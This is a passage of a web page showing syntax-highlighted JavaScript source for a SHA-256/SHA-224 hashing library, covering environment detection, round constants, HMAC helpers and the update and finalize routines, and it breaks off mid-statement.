class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-string">&#x27;use strict&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">ERROR</span> = <span class="hljs-string">&#x27;input is invalid type&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">WINDOW</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> === <span class="hljs-string">&#x27;object&#x27;</span>;<br>    <span class="hljs-keyword">var</span> root = <span class="hljs-variable constant_">WINDOW</span> ? <span class="hljs-variable language_">window</span> : &#123;&#125;;<br>    <span class="hljs-keyword">if</span> (root.<span class="hljs-property">JS_SHA256_NO_WINDOW</span>) &#123;<br>        <span class="hljs-variable constant_">WINDOW</span> = <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">WEB_WORKER</span> = !<span class="hljs-variable constant_">WINDOW</span> &amp;&amp; <span class="hljs-keyword">typeof</span> self === <span class="hljs-string">&#x27;object&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">NODE_JS</span> = !root.<span class="hljs-property">JS_SHA256_NO_NODE_JS</span> &amp;&amp; <span class="hljs-keyword">typeof</span> process === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; process.<span class="hljs-property">versions</span> &amp;&amp; process.<span class="hljs-property">versions</span>.<span class="hljs-property">node</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">NODE_JS</span>) &#123;<br>        root = <span class="hljs-variable language_">global</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">WEB_WORKER</span>) &#123;<br>        root = self<br>    &#125;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">COMMON_JS</span> = !root.<span class="hljs-property">JS_SHA256_NO_COMMON_JS</span> &amp;&amp; <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">module</span> === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">AMD</span> = <span class="hljs-keyword">typeof</span> define === <span class="hljs-string">&#x27;function&#x27;</span> &amp;&amp; define.<span class="hljs-property">amd</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">ARRAY_BUFFER</span> = !root.<span class="hljs-property">JS_SHA256_NO_ARRAY_BUFFER</span> &amp;&amp; <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">ArrayBuffer</span> !== <span class="hljs-string">&#x27;undefined&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">HEX_CHARS</span> = <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">EXTRA</span> = [-<span class="hljs-number">2147483648</span>, <span class="hljs-number">8388608</span>, <span class="hljs-number">32768</span>, <span class="hljs-number">128</span>];<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">SHIFT</span> = [<span class="hljs-number">24</span>, <span class="hljs-number">16</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">var</span> K = [<span class="hljs-number">0x428a2f98</span>, <span class="hljs-number">0x71374491</span>, <span class="hljs-number">0xb5c0fbcf</span>, <span class="hljs-number">0xe9b5dba5</span>, <span class="hljs-number">0x3956c25b</span>, <span class="hljs-number">0x59f111f1</span>, <span class="hljs-number">0x923f82a4</span>, <span class="hljs-number">0xab1c5ed5</span>, <span class="hljs-number">0xd807aa98</span>, <span class="hljs-number">0x12835b01</span>, <span class="hljs-number">0x243185be</span>, <span class="hljs-number">0x550c7dc3</span>, <span class="hljs-number">0x72be5d74</span>, <span class="hljs-number">0x80deb1fe</span>, <span class="hljs-number">0x9bdc06a7</span>, <span class="hljs-number">0xc19bf174</span>, <span class="hljs-number">0xe49b69c1</span>, <span class="hljs-number">0xefbe4786</span>, <span class="hljs-number">0x0fc19dc6</span>, <span class="hljs-number">0x240ca1cc</span>, <span class="hljs-number">0x2de92c6f</span>, <span class="hljs-number">0x4a7484aa</span>, <span class="hljs-number">0x5cb0a9dc</span>, <span class="hljs-number">0x76f988da</span>, <span class="hljs-number">0x983e5152</span>, <span class="hljs-number">0xa831c66d</span>, <span class="hljs-number">0xb00327c8</span>, <span class="hljs-number">0xbf597fc7</span>, <span class="hljs-number">0xc6e00bf3</span>, <span class="hljs-number">0xd5a79147</span>, <span class="hljs-number">0x06ca6351</span>, <span class="hljs-number">0x14292967</span>, <span class="hljs-number">0x27b70a85</span>, <span class="hljs-number">0x2e1b2138</span>, <span class="hljs-number">0x4d2c6dfc</span>, <span class="hljs-number">0x53380d13</span>, <span class="hljs-number">0x650a7354</span>, <span class="hljs-number">0x766a0abb</span>, <span class="hljs-number">0x81c2c92e</span>, <span class="hljs-number">0x92722c85</span>, <span class="hljs-number">0xa2bfe8a1</span>, <span class="hljs-number">0xa81a664b</span>, <span class="hljs-number">0xc24b8b70</span>, <span class="hljs-number">0xc76c51a3</span>, <span class="hljs-number">0xd192e819</span>, <span class="hljs-number">0xd6990624</span>, <span class="hljs-number">0xf40e3585</span>, <span class="hljs-number">0x106aa070</span>, <span class="hljs-number">0x19a4c116</span>, <span class="hljs-number">0x1e376c08</span>, <span class="hljs-number">0x2748774c</span>, <span class="hljs-number">0x34b0bcb5</span>, <span class="hljs-number">0x391c0cb3</span>, <span class="hljs-number">0x4ed8aa4a</span>, <span class="hljs-number">0x5b9cca4f</span>, <span class="hljs-number">0x682e6ff3</span>, <span class="hljs-number">0x748f82ee</span>, <span class="hljs-number">0x78a5636f</span>, <span class="hljs-number">0x84c87814</span>, <span class="hljs-number">0x8cc70208</span>, <span class="hljs-number">0x90befffa</span>, <span class="hljs-number">0xa4506ceb</span>, <span class="hljs-number">0xbef9a3f7</span>, <span class="hljs-number">0xc67178f2</span>];<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">OUTPUT_TYPES</span> = [<span class="hljs-string">&#x27;hex&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;digest&#x27;</span>, <span class="hljs-string">&#x27;arrayBuffer&#x27;</span>];<br>    <span class="hljs-keyword">var</span> blocks = [];<br>    <span class="hljs-keyword">if</span> (root.<span class="hljs-property">JS_SHA256_NO_NODE_JS</span> || !<span class="hljs-title class_">Array</span>.<span class="hljs-property">isArray</span>) &#123;<br>        <span class="hljs-title class_">Array</span>.<span class="hljs-property">isArray</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj) === <span class="hljs-string">&#x27;[object Array]&#x27;</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">ARRAY_BUFFER</span> &amp;&amp; (root.<span class="hljs-property">JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW</span> || !<span class="hljs-title class_">ArrayBuffer</span>.<span class="hljs-property">isView</span>)) &#123;<br>        <span class="hljs-title class_">ArrayBuffer</span>.<span class="hljs-property">isView</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> obj === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; obj.<span class="hljs-property">buffer</span> &amp;&amp; obj.<span class="hljs-property">buffer</span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">ArrayBuffer</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">var</span> createOutputMethod = <span class="hljs-keyword">function</span>(<span class="hljs-params">outputType, is224</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sha256</span>(is224, <span class="hljs-literal">true</span>).<span class="hljs-title function_">update</span>(message)[outputType]()<br>            &#125;<br>        &#125;;<br>    <span class="hljs-keyword">var</span> createMethod = <span class="hljs-keyword">function</span>(<span class="hljs-params">is224</span>) &#123;<br>            <span class="hljs-keyword">var</span> method = <span class="hljs-title function_">createOutputMethod</span>(<span class="hljs-string">&#x27;hex&#x27;</span>, is224);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">NODE_JS</span>) &#123;<br>                method = <span class="hljs-title function_">nodeWrap</span>(method, is224)<br>            &#125;<br>            method.<span class="hljs-property">create</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sha256</span>(is224)<br>            &#125;;<br>            method.<span class="hljs-property">update</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) &#123;<br>                <span class="hljs-keyword">return</span> method.<span class="hljs-title function_">create</span>().<span class="hljs-title function_">update</span>(message)<br>            &#125;;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-variable constant_">OUTPUT_TYPES</span>.<span class="hljs-property">length</span>; ++i) &#123;<br>                <span class="hljs-keyword">var</span> type = <span class="hljs-variable constant_">OUTPUT_TYPES</span>[i];<br>                method[type] = <span class="hljs-title function_">createOutputMethod</span>(type, is224)<br>            &#125;<br>            <span class="hljs-keyword">return</span> method<br>        &#125;;<br>    <span class="hljs-keyword">var</span> nodeWrap = <span class="hljs-keyword">function</span>(<span class="hljs-params">method, is224</span>) &#123;<br>            <span class="hljs-keyword">var</span> crypto = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;require(&#x27;crypto&#x27;)&quot;</span>);<br>            <span class="hljs-keyword">var</span> <span class="hljs-title class_">Buffer</span> = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;require(&#x27;buffer&#x27;).Buffer&quot;</span>);<br>            <span class="hljs-keyword">var</span> algorithm = is224 ? <span class="hljs-string">&#x27;sha224&#x27;</span> : <span class="hljs-string">&#x27;sha256&#x27;</span>;<br>            <span class="hljs-keyword">var</span> nodeMethod = <span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> message === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>                        <span class="hljs-keyword">return</span> crypto.<span class="hljs-title function_">createHash</span>(algorithm).<span class="hljs-title function_">update</span>(message, <span class="hljs-string">&#x27;utf8&#x27;</span>).<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> (message === <span class="hljs-literal">null</span> || message === <span class="hljs-literal">undefined</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (message.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">ArrayBuffer</span>) &#123;<br>                            message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(message)<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(message) || <span class="hljs-title class_">ArrayBuffer</span>.<span class="hljs-title function_">isView</span>(message) || message.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Buffer</span>) &#123;<br>                        <span class="hljs-keyword">return</span> crypto.<span class="hljs-title function_">createHash</span>(algorithm).<span class="hljs-title function_">update</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Buffer</span>(message)).<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-title function_">method</span>(message)<br>                    &#125;<br>                &#125;;<br>            <span class="hljs-keyword">return</span> nodeMethod<br>        &#125;;<br>    <span class="hljs-keyword">var</span> createHmacOutputMethod = <span class="hljs-keyword">function</span>(<span class="hljs-params">outputType, is224</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">key, message</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HmacSha256</span>(key, is224, <span class="hljs-literal">true</span>).<span class="hljs-title function_">update</span>(message)[outputType]()<br>            &#125;<br>        &#125;;<br>    <span class="hljs-keyword">var</span> createHmacMethod = <span class="hljs-keyword">function</span>(<span class="hljs-params">is224</span>) &#123;<br>            <span class="hljs-keyword">var</span> method = <span class="hljs-title function_">createHmacOutputMethod</span>(<span class="hljs-string">&#x27;hex&#x27;</span>, is224);<br>            method.<span class="hljs-property">create</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">key</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HmacSha256</span>(key, is224)<br>            &#125;;<br>            method.<span class="hljs-property">update</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">key, message</span>) &#123;<br>                <span class="hljs-keyword">return</span> method.<span class="hljs-title function_">create</span>(key).<span class="hljs-title function_">update</span>(message)<br>            &#125;;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-variable constant_">OUTPUT_TYPES</span>.<span class="hljs-property">length</span>; ++i) &#123;<br>                <span class="hljs-keyword">var</span> type = <span class="hljs-variable constant_">OUTPUT_TYPES</span>[i];<br>                method[type] = <span class="hljs-title function_">createHmacOutputMethod</span>(type, is224)<br>            &#125;<br>            <span class="hljs-keyword">return</span> method<br>        &#125;;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Sha256</span>(<span class="hljs-params">is224, sharedMemory</span>) &#123;<br>        <span class="hljs-keyword">if</span> (sharedMemory) &#123;<br>            blocks[<span class="hljs-number">0</span>] = blocks[<span class="hljs-number">16</span>] = blocks[<span class="hljs-number">1</span>] = blocks[<span class="hljs-number">2</span>] = blocks[<span class="hljs-number">3</span>] = blocks[<span class="hljs-number">4</span>] = blocks[<span class="hljs-number">5</span>] = blocks[<span class="hljs-number">6</span>] = blocks[<span class="hljs-number">7</span>] = blocks[<span class="hljs-number">8</span>] = blocks[<span class="hljs-number">9</span>] = blocks[<span class="hljs-number">10</span>] = blocks[<span class="hljs-number">11</span>] = blocks[<span class="hljs-number">12</span>] = blocks[<span class="hljs-number">13</span>] = blocks[<span class="hljs-number">14</span>] = blocks[<span class="hljs-number">15</span>] = <span class="hljs-number">0</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">blocks</span> = blocks<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">blocks</span> = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br>        &#125;<br>        <span class="hljs-keyword">if</span> (is224) &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span> = <span class="hljs-number">0xc1059ed8</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span> = <span class="hljs-number">0x367cd507</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span> = <span class="hljs-number">0x3070dd17</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span> = <span class="hljs-number">0xf70e5939</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span> = <span class="hljs-number">0xffc00b31</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span> = <span class="hljs-number">0x68581511</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span> = <span class="hljs-number">0x64f98fa7</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span> = <span class="hljs-number">0xbefa4fa4</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span> = <span class="hljs-number">0x6a09e667</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span> = <span class="hljs-number">0xbb67ae85</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span> = <span class="hljs-number">0x3c6ef372</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span> = <span class="hljs-number">0xa54ff53a</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span> = <span class="hljs-number">0x510e527f</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span> = <span class="hljs-number">0x9b05688c</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span> = <span class="hljs-number">0x1f83d9ab</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span> = <span class="hljs-number">0x5be0cd19</span><br>        &#125;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">block</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">start</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">hBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">finalized</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">hashed</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">first</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span> = is224<br>    &#125;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">update</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">finalized</span>) &#123;<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>        <span class="hljs-keyword">var</span> notString, type = <span class="hljs-keyword">typeof</span> message;<br>        <span class="hljs-keyword">if</span> (type !== <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (message === <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">ARRAY_BUFFER</span> &amp;&amp; message.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">ArrayBuffer</span>) &#123;<br>                    message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(message)<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(message)) &#123;<br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-variable constant_">ARRAY_BUFFER</span> || !<span class="hljs-title class_">ArrayBuffer</span>.<span class="hljs-title function_">isView</span>(message)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>            &#125;<br>            notString = <span class="hljs-literal">true</span><br>        &#125;<br>        <span class="hljs-keyword">var</span> code, index = <span class="hljs-number">0</span>,<br>            i, length = message.<span class="hljs-property">length</span>,<br>            blocks = <span class="hljs-variable language_">this</span>.<span class="hljs-property">blocks</span>;<br>        <span class="hljs-keyword">while</span> (index &lt; length) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hashed</span>) &#123;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">hashed</span> = <span class="hljs-literal">false</span>;<br>                blocks[<span class="hljs-number">0</span>] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">block</span>;<br>                blocks[<span class="hljs-number">16</span>] = blocks[<span class="hljs-number">1</span>] = blocks[<span class="hljs-number">2</span>] = blocks[<span class="hljs-number">3</span>] = blocks[<span class="hljs-number">4</span>] = blocks[<span class="hljs-number">5</span>] = blocks[<span class="hljs-number">6</span>] = blocks[<span class="hljs-number">7</span>] = blocks[<span class="hljs-number">8</span>] = blocks[<span class="hljs-number">9</span>] = blocks[<span class="hljs-number">10</span>] = blocks[<span class="hljs-number">11</span>] = blocks[<span class="hljs-number">12</span>] = blocks[<span class="hljs-number">13</span>] = blocks[<span class="hljs-number">14</span>] = blocks[<span class="hljs-number">15</span>] = <span class="hljs-number">0</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (notString) &#123;<br>                <span class="hljs-keyword">for</span> (i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">start</span>; index &lt; length &amp;&amp; i &lt; <span class="hljs-number">64</span>; ++index) &#123;<br>                    blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= message[index] &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>]<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">for</span> (i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">start</span>; index &lt; length &amp;&amp; i &lt; <span class="hljs-number">64</span>; ++index) &#123;<br>                    code = message.<span class="hljs-title function_">charCodeAt</span>(index);<br>                    <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0x80</span>) &#123;<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= code &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>]<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0x800</span>) &#123;<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0xc0</span> | (code &gt;&gt; <span class="hljs-number">6</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>];<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0x80</span> | (code &amp; <span class="hljs-number">0x3f</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>]<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0xd800</span> || code &gt;= <span class="hljs-number">0xe000</span>) &#123;<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0xe0</span> | (code &gt;&gt; <span class="hljs-number">12</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>];<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0x80</span> | ((code &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0x3f</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>];<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0x80</span> | (code &amp; <span class="hljs-number">0x3f</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>]<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        code = <span class="hljs-number">0x10000</span> + (((code &amp; <span class="hljs-number">0x3ff</span>) &lt;&lt; <span class="hljs-number">10</span>) | (message.<span class="hljs-title function_">charCodeAt</span>(++index) &amp; <span class="hljs-number">0x3ff</span>));<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0xf0</span> | (code &gt;&gt; <span class="hljs-number">18</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>];<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0x80</span> | ((code &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x3f</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>];<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0x80</span> | ((code &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0x3f</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>];<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0x80</span> | (code &amp; <span class="hljs-number">0x3f</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>]<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastByteIndex</span> = i;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> += i - <span class="hljs-variable language_">this</span>.<span class="hljs-property">start</span>;<br>            <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">64</span>) &#123;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">block</span> = blocks[<span class="hljs-number">16</span>];<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">start</span> = i - <span class="hljs-number">64</span>;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">hash</span>();<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">hashed</span> = <span class="hljs-literal">true</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">start</span> = i<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> &gt; <span class="hljs-number">4294967295</span>) &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">hBytes</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> / <span class="hljs-number">4294967296</span> &lt;&lt; <span class="hljs-number">0</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> % <span class="hljs-number">4294967296</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span><br>    &#125;;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">finalize</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">finalized</span>) &#123;<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">finalized</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">var</span> blocks = <span class="hljs-variable language_">this</span>.<span class="hljs-property">blocks</span>,<br>            i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastByteIndex</span>;<br>        blocks[<span class="hljs-number">16</span>] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">block</span>;<br>        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= <span class="hljs-variable constant_">EXTRA</span>[i &amp; <span class="hljs-number">3</span>];<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">block</span> = blocks[<span class="hljs-number">16</span>];<br>        <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">56</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">hashed</span>) &#123;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">hash</span>()<br>            &#125;<br>            blocks[<span class="hljs-number">0</span>] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">block</span>;<br>            blocks[<span class="hljs-number">16</span>] = 